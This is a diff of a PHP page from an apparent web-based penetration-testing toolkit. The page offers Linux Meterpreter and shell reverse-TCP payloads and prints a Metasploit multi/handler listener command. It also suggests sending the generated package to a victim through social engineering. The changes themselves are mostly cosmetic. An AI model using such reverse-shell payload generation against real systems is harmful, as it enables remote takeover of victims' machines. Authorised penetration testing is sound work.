@@ -24,7 +24,7 @@ require_once 'u.php';
 ?>
 
 <section id="main" class="column">
-		
+	
 		<h4 class="alert_info">Welcome to the Web Based Penetration Testing Toolkit.</h4>
 	<div class="clear"></div>
 		
@@ -54,8 +54,9 @@ require_once 'u.php';
         <label>Linux Payload</label><label style="float:right;margin-right: 2%">Description</label><br/>     
         <p><input type="radio" value="linux/x86/meterpreter/reverse_tcp" name="c" checked="true">  Linux x86 Meterpreter Reverse Tcp	 <v style=" float: right;margin-right:  4%"> Connect back to the attacker, Staged meterpreter server</v> </p>
    <p><input  type="radio" value="linux/x86/shell_reverse_tcp" name="c" > Linux x86 shell reverse_tcp<v style=" float: right;margin-right:  4%"> Connect back to the attacker, Spawn a command shell</v> </p>
-    </fieldset>				
-		
+    </fieldset>	
+                                        
+	
 						<div class="clear"></div>
 				</div>
 			<footer>
@@ -67,6 +68,7 @@ require_once 'u.php';
 			</footer>
 </form>
 		</article><!-- end of post new article -->
+              
                  <?php
                
                 if(isset($_POST['submit']))
@@ -82,7 +84,8 @@ require_once 'u.php';
              
                    }else{
                        
-                   
+              echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Generating Payloads, please wait... ! Please refer result section after this message'});</script>";
+           
                  require_once 'loading.php';
                  echo "<fieldset>";
                  switch($p){
@@ -113,10 +116,12 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b> sudo msfcli exploit/multi/handler PAYLOAD='.$c.'  LHOST='.$ip.' LPORT='.$port.' E  </b></code>'; 
 
 $host=$_SERVER['SERVER_ADDR'];
 	        echo "<p>To Open Terminal Click <a target='_blank' href='https://$host:4200/'>here</a></p>";
+                 echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : 'Payload Generated  ! Please refer result section after this message'});</script>";
+     
 
          echo '</div>
                                     <footer>
